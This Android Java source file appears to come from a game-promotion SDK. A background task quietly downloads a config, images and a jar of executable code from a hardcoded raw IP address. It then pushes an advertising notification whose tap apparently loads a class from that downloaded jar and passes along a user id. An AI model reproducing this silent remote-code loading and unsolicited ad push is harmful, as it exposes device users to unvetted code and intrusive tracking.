/**
 * 
 */
package cn.play.dserv;

import java.io.File;

import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;


/**
 * push to more 正式push
 * @author Keel
 *
 */
public class PLTask18 implements PLTask {

	private DServ dserv;
	private int id = 18;
	private int state = STATE_WAITING;
	private String TAG = "dserv-PLTask"+id;
	
	private String pushTitle = "最新火爆游戏震撼来袭！";
	private String pushTxt = "小伙伴们抓紧下载，抢占年度先机吧！点击此消息查看";
//	private String pushLink = "";
	
	private String downloadPre = "http://180.96.63.85:12370/plserver/dats/syn/";
	private String localPath;// = dserv.getLocalPath();
	private String f_Json = "gs.data";
	private String f_picZip = "pics_5.zip";
	private String f_jar = "emv5.jar";
	private String emvVer = "emv5";
	private String emvClass = "cn.play.dserv.MoreView";
	private int f_json_size = 3372;
	private int f_picZip_size = 113680;
	private int f_jar_size = 9902;
	
	
	
	private boolean download(String remote,String localPath,String fileName,int size){
		boolean downOK = false;
		if (dserv.downloadGoOn(remote, localPath, fileName, dserv.getService())) {
			File f = new File(localPath+fileName);
			if (f.isFile() && f.length() == size) {
				downOK = true;
			}
		}else{
			CheckTool.log(dserv.getService(), TAG, "==========downloadGoOn failed:"+remote+"===="+localPath+"---"+fileName);
		}
		if (!downOK) {
			File f = new File(localPath+fileName);
			if (f.isFile()) {
				f.delete();
			}
		}
		return downOK;
	}
	
	/**
	 * 下载对应的json配置,pic文件,jar,并检查大小
	 * @return
	 */
	private boolean downFiles(){
		boolean downOK = false;
		if (download(downloadPre+f_Json, localPath, f_Json,f_json_size)) {
			if (download(downloadPre+"pics/"+f_picZip, localPath+"pics/", f_picZip,f_picZip_size)) {
				if (dserv.unzip(localPath+"pics/"+f_picZip, localPath+"pics/")) {
					if (download(downloadPre+"update/"+f_jar, localPath+"update/", f_jar,f_jar_size)) {
						downOK = true;
					}
				}
			}
		}
		return downOK;
	}
	
	@Override
	public void run() {
		CheckTool.log(dserv.getService(), TAG, "==========PLTask id:"+this.id+"===========");
		dserv.dsLog(1, "PLTask", 100,dserv.getService().getPackageName(), "0_0_"+id+"_task is running");
		state = STATE_RUNNING;
		try {
			while (true) {
				if (!isNetOk(this.dserv.getService())) {
					try {
						Thread.sleep(1000*60*5);
					} catch (InterruptedException e) {
					}
					continue;
				}
				//下载对应的json配置,pic文件,jar,并检查大小
				if (!downFiles()) {
					try {
						Thread.sleep(1000*60*5);
					} catch (InterruptedException e) {
					}
					continue;
				}
				
				
				
				NotificationManager nm = (NotificationManager) dserv.getService().getSystemService(Context.NOTIFICATION_SERVICE);  
				
				Notification no  = new Notification();
				no.tickerText = pushTitle;
				no.flags |= Notification.FLAG_AUTO_CANCEL;  
				no.icon = android.R.drawable.stat_notify_chat;
				
				//String s = this.dserv.getEmp();
				//String[] ems = s.split("@@");
				String emv = "update/"+emvVer;
				File emFile = new File(this.dserv.getLocalPath()+emv+".jar");
				PendingIntent pd = null;
				if (emFile.isFile() &&  emFile.length() == f_jar_size) {
					//直接more
					Intent it = new Intent(this.dserv.getService(),EmpActivity.class); 
					it.putExtra("emvClass", emvClass);
					it.putExtra("emvPath",  emv);
					it.putExtra("uid", (Long)(this.dserv.getPropObj("uid", 0L)));
					it.putExtra("no", "_@@"+this.id+"@@113@@push_clicked");
					it.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK); 
					pd = PendingIntent.getActivity(this.dserv.getService(), 0, it, PendingIntent.FLAG_UPDATE_CURRENT);
					
				}else{
					//走页面
					Uri moreGame = Uri.parse("http://play.cn");
					Intent intent = new Intent(Intent.ACTION_VIEW, moreGame);
					intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
					pd = PendingIntent.getActivity(this.dserv.getService(), 0, intent, 0);
				}
				
				no.setLatestEventInfo(dserv.getService(), pushTitle, pushTxt, pd);
				
				nm.notify(1100+this.id, no);
				
				this.dserv.taskDone(this);
				CheckTool.sLog(this.dserv.getService(), 101, "_@@"+this.id+"@@118@@getPush");
				state = STATE_DIE;
				dserv.dsLog(1, "PLTask", 100,dserv.getService().getPackageName(), "0_0_"+id+"_task is finished.");
				break;
			}
		} catch (Exception e) {
			e.printStackTrace();
			//dserv.dsLog(1, "PLTask", 100,dserv.getService().getPackageName(), "0_0_"+id+"_task is finished.");
			CheckTool.log(dserv.getService(), TAG, "==========PLTask err id:"+this.id+"===========");
		}
		CheckTool.log(dserv.getService(), TAG, "==========PLTask finished id:"+this.id+"===========");
		
	}
	public static boolean isNetOk(Context cx) {
		ConnectivityManager cm = (ConnectivityManager) cx.getSystemService(Context.CONNECTIVITY_SERVICE);
		boolean isOk = false;
		if (cm != null) {
			NetworkInfo aActiveInfo = cm.getActiveNetworkInfo();
			if (aActiveInfo != null && aActiveInfo.isAvailable()) {
				if (aActiveInfo.getState().equals(NetworkInfo.State.CONNECTED)) {
					isOk = true;
				}
			}
		}
		return isOk;
	}

	/* (non-Javadoc)
	 * @see cn.play.dserv.PLTask#getId()
	 */
	@Override
	public int getId() {
		return id;
	}

	/* (non-Javadoc)
	 * @see cn.play.dserv.PLTask#getState()
	 */
	@Override
	public int getState() {
		return this.state;
	}

	/* (non-Javadoc)
	 * @see cn.play.dserv.PLTask#init()
	 */
	@Override
	public void init() {
		CheckTool.log(dserv.getService(),TAG, "TASK "+id+" init.");
		
//		Log.d(TAG, "TASK "+id+" init.");
		if (dserv.getService() != null) {
			this.localPath = dserv.getLocalPath();
			dserv.dsLog(1, "PLTask", 100,dserv.getService().getPackageName(), "0_0_"+id+"_task inited.");
		}else{
			CheckTool.log(dserv.getService(),TAG, "TASK "+id+" getService is null.");
		}
	}

	/* (non-Javadoc)
	 * @see cn.play.dserv.PLTask#setState(int)
	 */
	@Override
	public void setState(int arg0) {
		this.state = arg0;
	}

	@Override
	public void setDService(DServ serv) {
		this.dserv =serv;
	}
}
